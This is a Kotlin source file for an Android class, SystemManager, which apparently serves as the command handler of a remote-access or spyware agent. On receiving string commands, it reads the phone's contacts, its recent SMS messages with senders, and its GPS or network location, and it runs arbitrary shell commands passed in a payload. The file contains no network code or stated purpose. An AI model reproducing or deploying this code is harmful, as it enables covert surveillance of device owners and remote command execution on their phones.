package com.example.agent

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class SystemManager(private val context: Context) {

    fun executeAction(action: String, payload: JSONObject?): JSONObject {
        val response = JSONObject()
        when (action) {
            "GET_CONTACTS" -> response.put("contacts", getContacts())
            "GET_SMS" -> response.put("messages", getSms(payload?.optInt("limit", 10) ?: 10))
            "GET_LOCATION" -> response.put("location", getLocation())
            "EXEC_SHELL" -> response.put("output", runShell(payload?.optString("command") ?: "ls"))
        }
        return response
    }

    private fun hasPerm(perm: String) = ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED

    private fun getContacts(): JSONArray {
        val arr = JSONArray()
        if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) return arr
        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            var c = 0
            while (it.moveToNext() && c < 30) {
                arr.put(JSONObject().apply {
                    put("name", if (nIdx >= 0) it.getString(nIdx) else "")
                    put("number", if (pIdx >= 0) it.getString(pIdx) else "")
                })
                c++
            }
        }
        return arr
    }

    private fun getSms(limit: Int): JSONArray {
        val arr = JSONArray()
        if (!hasPerm(android.Manifest.permission.READ_SMS)) return arr
        val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")
        cursor?.use {
            val aIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bIdx = it.getColumnIndex(Telephony.Sms.BODY)
            var c = 0
            while (it.moveToNext() && c < limit) {
                arr.put(JSONObject().apply {
                    put("address", if (aIdx >= 0) it.getString(aIdx) else "")
                    put("body", if (bIdx >= 0) it.getString(bIdx) else "")
                })
                c++
            }
        }
        return arr
    }

    @SuppressLint("MissingPermission")
    private fun getLocation(): JSONObject {
        val obj = JSONObject()
        if (!hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION)) return obj
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        loc?.let {
            obj.put("latitude", it.latitude)
            obj.put("longitude", it.longitude)
        }
        return obj
    }

    private fun runShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(cmd)
            val br = BufferedReader(InputStreamReader(p.inputStream))
            val sb = StringBuilder()
            var line: String?
            while (br.readLine().also { line = it } != null) { sb.append(line).append("\n") }
            sb.toString()
        } catch (e: Exception) { e.message ?: "Error" }
    }
}
